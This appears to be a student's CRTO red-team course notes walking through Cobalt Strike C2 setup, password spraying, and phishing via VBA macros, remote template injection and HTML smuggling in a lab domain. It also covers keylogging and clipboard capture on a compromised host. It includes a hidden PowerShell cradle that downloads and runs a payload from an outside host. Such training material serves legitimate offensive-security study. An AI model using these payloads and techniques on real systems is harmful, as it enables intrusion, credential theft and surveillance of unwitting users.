# CRTO



# COMMAND & CONTROL
### Starting and connecting to the Team Server
1. run `team server SSH` > type `tmux` in the terminal > cd cobaltstrike > `sudo ./teamserver <IP_Attacker> <Password> c2-profiles/normal/webbug.profile`

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/c857de3c-ea19-40da-8247-73bcf9309cb7)

2. launch the client

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/2127a7ea-a1e9-4f71-82de-eb764dc8ea30)

3. make sure that both of the fingerprint hashes are the same

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/64c9d4e8-7bd4-4a46-9e30-ffa0efae2ed9)

### Listerner Management
.    Gress Listener uses HTTP/S & DNS; Peer2Peer users SMB & raw TCP
.    use `sudo ss -lntp` to check the listing ports
1. http listener

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/4cc00aae-bcc2-4344-a678-a14075a29dd2)

2. DNS listener

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/95028a42-a826-459d-a66f-e746d716a8b2)

.    test the DNS listener using `dig @ns1.nickelviper.com test.pics.nickelviper.com +short`. The team server's default response is 0.0.0.0

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/fb4b98c6-093c-4adb-a4d5-67d8db8c07a6)

3. SMB listener
.    beacon SMB payload will start a new named pipe server but the default pipe name is quite well signatured by EDRs. instead, use the following command `ls \\.\pipe` in powersehll. Take any pipe name and rename the last 4 letters to make it unique

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/80a5f0a7-c513-4d21-aaba-a733b9ae069c)

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/4808fd11-337e-41f8-8f01-3b8775805abd)

4. TCP
.    you may specify whether it will bind to only the localhost (127.0.0.1), otherwise, it will bind to all interfaces (0.0.0.0).

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/e314926e-c8d7-4dba-85f8-ebd5fde25318)

5. Below are the full listeners that we are going to use

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/ffb3df80-72bd-44a8-b099-d0a52774bd51)

### Generating Payloads
- in gress payload you will directly interact with the beacon

1. duble click on the payload and you will get a beacon

  ![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/1a8f88bb-1011-48da-9572-d5843562a2a1)

  ![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/ad1eda16-6efc-444f-8258-4e2c6bfce176)

- in Peer2Peer use `connect` command for TCP; use 'link' command for SMB

1. run tcp-local payload 

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/a21c97d3-3cf6-4ed8-a8da-2cdf054649b3)

2. check if port 4444 is opened in powershell `netstat -anop tcp | findstr 4444`

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/c16283c0-9272-4471-8e97-3695017ba286)

we will see that a new port is opened and waiting for a connection

3. connect to tcp beacon using `connect localhost 4444`

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/47913fc7-e260-420e-928e-2eb0dd57e55f)

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/8367e11b-00ff-465e-856c-2484af56905f)

here we just connected to ourselves in terms of understanding only

### Pivot Listener
1. To create a pivot listener, right-click on a Beacon and select `Pivoting` > `Listener`. This will open a new listener window

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/58cd9bd4-0d90-4014-8ff3-64dd2100546d)

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/7048e894-648e-4455-aa79-54b516b784ff)

2. after clicking save, `run netstat -anop tcp` to see your port is listening

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/6a2a527b-0705-48d7-a379-86708943f1e6)

3. We can now generate payloads for this listener, `Payloads` > `windows Stageless Payload`.

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/4d6577c7-07c2-4922-b9c7-a675a3188da1)

choose the pivot listener and generate the payload and save it in Payloads folder

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/532aadf2-5b22-4452-8ee0-01ce88627e97)

4. run the payload, and you will get a new beacon

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/4322c4ec-5cc7-498c-bb34-2bed1812b99b)

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/aa29e7be-72cd-4981-b172-6d5c0d5879a2)

5. check `spawn`, `elevate`, and `jump` commands.

### Running as a service
1. create a `teamserver.service`file in `/etc/systemd/system`
```
attacker@ubuntu ~> sudo nano /etc/systemd/system/teamserver.service
```
2. paste the following content
```
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target
```
3. Next, reload the systemd manager and check the status of the service.  It will be inactive/dead.
```
attacker@ubuntu ~> sudo systemctl daemon-reload
attacker@ubuntu ~> sudo systemctl status teamserver.service
```
4. Start the service and check its status again.
```
attacker@ubuntu ~> sudo systemctl start teamserver.service
attacker@ubuntu ~> sudo systemctl status teamserver.service
```
5. Start the service on bootup.
```
attacker@ubuntu ~> sudo systemctl enable teamserver.service
```



# External Reconnaissance
### DNS Records
1. Performing DNS lookup of any `A` records for the domain
```
dig cyberbotic.io
```
![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/e31d41b8-b830-44cd-af8b-68c029d0c2f5)

2. Performing a `whois` on each public IP address can show who it belongs to. We can see that it resolves to a 3rd party provider, Cloudflare.
```
whois 172.67.205.143
```
![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/6f8687e5-a382-4629-ab08-191490bcf0fd)

3. brute force subdomain using `dnscan`
```
./dnscan.py -d cyberbotic.io -w subdomains-100.txt
```
![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/f6f451a0-a062-4a03-90e5-9509532238b4)

From the output above, we've discovered www and mail subdomains. if you notice that mail resolves to an internal address rather than a public address

4. [Spoofy](https://github.com/MattKeeley/Spoofy) is a Python tool that can verify the email security of a given domain.

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/06f308e6-72b1-4a1b-b29d-4cf7acdec0ae)

#### Google Dorks
1. site:  Limit the search results to those from a specific website.
site:apple.com

Not so useful by itself but will return every page that Google has indexed for the apple.com domain.



2. intitle:  Find pages with a certain word in the title.
intitle:apple

This will return every page that contains the word "apple" in the title.



3. inurl:  Find pages with a certain word in the URL.
inurl:apple

This will return every page where "apple" appears in the URL.



4. intext:  Find pages containing a certain word (or words) somewhere in the content.
intext:apple

This will return every page where "apple" appears in the body text.



5. filetype:  Search for filetypes that Google understands.
site:apple.com filetype:pdf

This will return all PDFs on apple.com.  Other filetypes such as docx, pptx and xlsx also work.  This could be combined with intitle:report to find all PDFs that have "report" in the name.  Google does not understand all filetypes, so inurl could be used instead.



6. #..#:  Search for a range of numbers.
site:apple.com filetype:pdf 2020..2022

This will return all PDFs on apple.com which contain the numbers 2020, 2021 and 2022.  Useful for finding information constrained to a given timeframe.



7. Exclude a phrase.
site:apple.com -www -support

This will return pages indexed on apple.com excluding the www and support domains.  Useful for finding other subdomains.



# Initial Compromise
### Password Spraying
-    Methodology: `Enum NetBIOS of the Domain` > `Find usernames` > `find possible usernames` > `usernames validation` > `perform the attack`
1. [MailSniper](https://github.com/dafthack/MailSniper) is an excellent tool for password spraying against Offce 365. On the Attacker Desktop VM, open PowerShell and import MailSniper.ps1.
```
PS C:\Users\Attacker> ipmo C:\Tools\MailSniper\MailSniper.ps1
```
2. Enumerate the NetBIOS name of the target domain with `Invoke-DomainHarvestOWA`.
```
PS C:\Users\Attacker> Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
[*] Harvesting domain name from the server at mail.cyberbotic.io
The domain appears to be: CYBER or cyberbotic.io
```
3. find valid usernames from [cyberbotic](https://cyberbotic.io)
```
ubuntu@DESKTOP-3BSK7NO ~> cd /mnt/c/Users/Attacker/Desktop/
ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> cat names.txt
Bob Farmer
Isabel Yates
John King
Joyce Adams
```
4. find possible usernames from the username list using [namemash.py](https://gist.github.com/superkojiman/11076951)
```
ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> ~/namemash.py names.txt > possible.txt
ubuntu@DESKTOP-3BSK7NO /m/c/U/A/Desktop> head -n 5 possible.txt
bobfarmer
farmerbob
bob.farmer
farmer.bob
farmerb
```
5. `Invoke-UsernameHarvestOWA` uses a timing attack to validate which (if any) of these usernames are valid.
```
PS C:\Users\Attacker> Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
```
![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/e0c555f5-e30c-44ab-af67-de1d470b40a0)

6. MailSniper can spray passwords against the valid account(s) identified using, Outlook Web Access (OWA), Exchange Web Services (EWS) and Exchange ActiveSync (EAS).
```
PS C:\Users\Attacker> Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
```
![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/fa9661d0-7863-401f-a27b-288bb62c6042)

7. We can do further actions using MailSniper with valid credentials, such as downloading the global address list.
```
PS C:\Users\Attacker> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
```
![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/46008966-f8eb-4313-bae7-20239a9d2ff2)

### VBA Macros for internal phishing
1. create a macro in a word document by going to View > Macros > Create, then paste the following code
```
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub
```
2. we need to replace notepad with a Beacon payload. go to Attacks > Scripted Web Delivery and generate a 64-bit PowerShell payload. The URI path can be anything, but I will keep it as /a.

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/f6b68db3-6d55-4422-8e90-79bbf1fe02c6)

This will generate a PowerShell payload and host it on the team server so that it can be downloaded over HTTP and executed in-memory.  After clicking Launch, Cobalt Strike will generate the PowerShell one-liner that will do just that.

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/62a54826-dc73-45d3-b362-da0b4baf97a0)

3. Copy/paste this line into the VBA and make sure to add another set of double quotation marks around the IEX command.  It should look like this:
```
Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""
```
![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/20b20a5b-c41f-4193-a0ef-c613ec6724ab)

To prepare the document for delivery, go to `File` > `Info` > `Inspect Document` > `Inspect Document`, which will bring up the Document Inspector. Click Inspect and then Remove All next to Document Properties and Personal Information.  This is to prevent the username on your system being embedded in the document.

Next, go to `File` > `Save As` and save it to `C:\Payloads`.  Give it any filename, but in the Save as type dropdown, change the format from .docx to Word 97-2003 (.doc).

Go to `Site Management` > `Host File` you will see your powershell payload hosted on team server.

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/9c4b7525-0448-4425-99ad-cfcb29d54576)

4. send an email and attach your Word document. open the document and enable macros, then you will get a shell

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/99f340ed-fdf7-4008-a4d0-63dfa0ae613a)

### Remote Template Injection
Microsoft Word has the option of creating new documents from a template.  Office has some templates pre-installed, you can make custom templates, and even download new ones.  Remote Template Injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious template.  This template may hold a macro, leading to code execution.

- Automation

[Remoteinjector](https://github.com/JohnWoodman/remoteinjector) is a python tool that can automate this process so that you don't have to modify the XML manually.
```
ubuntu@DESKTOP-3BSK7NO ~> python3 remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx
URL Injected and saved to /mnt/c/Payloads/document_new.docx
```
- Manual

1. Open Word on the Attacker Desktop, create a new blank document, and insert your desired macro.  Save this to C:\Payloads as a Word 97-2003 Template (*.dot) file. This is now our "malicious remote template".  Use Cobalt Strike (`Site Management` > `Host File`) to host this file at http://nickelviper.com/template.dot.

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/e85268ec-0e37-4f37-9c04-da1bec795dd9)

this will give us the URL of template file

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/986f4457-6426-4051-aa2e-3be9c6adfb41)

2. create a new document from the blank template located in `C:\Users\Attacker\Documents\Custom Office Templates`.  Add any content you want, then save it to `C:\Payloads` as a new .docx.  Browse to the directory in explorer, right-click and select `7-Zip` > `Open archive`.  Navigate to `word` > `_rels`, right-click on `settings.xml.rels` and select Edit.

This is just a small XML file.  Scroll right until you see the Target entry.

It's currently pointing to the template on our local disk from which the document was created.  Simply modify this so it points to the template URL instead.

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/aba295a5-4c0d-41c6-820f-8cc9b7b55b89)

3. send the phishing email and attach your `WordDocument.docx`

4. before you open the word document. head to `View` > `Web Log` to check if you were able to hit the web server

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/7190462a-39c7-46c9-9dac-9778a5a9a976)

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/9533837a-32df-4cc4-a84d-6ac9db9bb4a8)

if you can see that template.dot has requested and downloaded by the `WordDocument.docx`

### HTML Smuggling
- Email and web scanners are capable of parsing these out and taking some action.  They may be removed entirely, or the URL content fetched and scanned by an AV sandbox.  HTML smuggling allows us to get around this by embedding the payload into the HTML source code and using JavaScript to construct URLs by the browser at runtime.

```
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```
As this goes over the wire, a scanner will only see HTML and JavaScript.  There are no hardcoded hyperlinks and the content type of the page itself is just `text/html`.

The encoded content in the `file` variable was created with:
```
ubuntu@DESKTOP-3BSK7NO ~> echo -en "This is a smuggled file" | base64
```

When you visit this page, the browser will automatically reconstruct and download the file without any interaction from the user.

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/94a5392c-5ae4-4d4d-89c1-6491eb66a614)

The Python HTTP server is a nice quick way to spin up a web server for testing.
```
python3 -m http.server 8080
```

# Host Reconnaissance
### Processes
- List running processes on a system using the `ps` command.  Can provide clues as to any custom applications and AV solutions that may be running.

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/09199bf7-06cc-4867-b373-fe552835cc5d)

- There are several interesting processes here including `Sysmon64`, `MsMpEng`, `elastic-endpoint`, and `elastic-agent`.  When running in medium integrity (i.e. a standard user), you will not be able to see arch, session and user information for processes that your current user does not own.

### Seatbelt
- [Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# tool which automatically collects enumeration data for a host.  It can check for security configurations such as OS info, AV, AppLocker, LAPS, PowerShell logging, audit policies, .NET versions, firewall rules, and more.
```
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system
```
![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/67576b83-a2bd-4657-aecb-3fc748806d78)

### Screenshots
- Taking screenshots of the user’s desktop can be useful just to see what they are doing.  It can show what systems or applications they're using, what shortcuts they have, what documents they’re working on and so on.

- Beacon has multiple commands for taking screenshots which work in slightly different ways.
```
printscreen               Take a single screenshot via PrintScr method
screenshot                Take a single screenshot
screenwatch               Take periodic screenshots of desktop
```
```
beacon> screenshot
[*] received screenshot of Sticky Notes from bfarmer (46kb)
```
To see all the screenshots that have been taken, go to `View` > `Screenshots`

![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/9c2d137d-7450-4dfd-a21a-931fdf033c6c)

### Keylogger
- A keylogger can capture the keystrokes of a user, which is especially useful for capturing usernames, passwords and other sensitive information.
```
beacon> keylogger
[+] received keystrokes from *Untitled - Notepad by bfarmer
```
- All keystrokes can be seen at View > Keystrokes.
![image](https://github.com/AbdullahZuhair21/CRTO/assets/154827329/46ad05a5-83c1-4919-a5a2-cba656cac309)

- The keylogger runs as a job that can be stopped with the `jobkill` command.
```
beacon> jobs
[*] Jobs

 JID  PID   Description
 ---  ---   -----------
 6    0     keystroke logger

beacon> jobkill 6
```

### Clipboard
- The clipboard command will capture any text from the user's clipboard (it does not capture images or any other types of data).  This can be handy for capturing credentials that are being copy/pasted, which can be especially prevalent when password managers are in use.
```
beacon> clipboard
[*] Tasked beacon to get clipboard contents

Clipboard Data (8 bytes):
Sup3rman
```
### User Sessions
- The `net logons` command will list the logon sessions on this machine.
```
beacon> net logons

Logged on users at \\localhost:

DEV\bfarmer
DEV\jking
DEV\WKSTN-2$
```
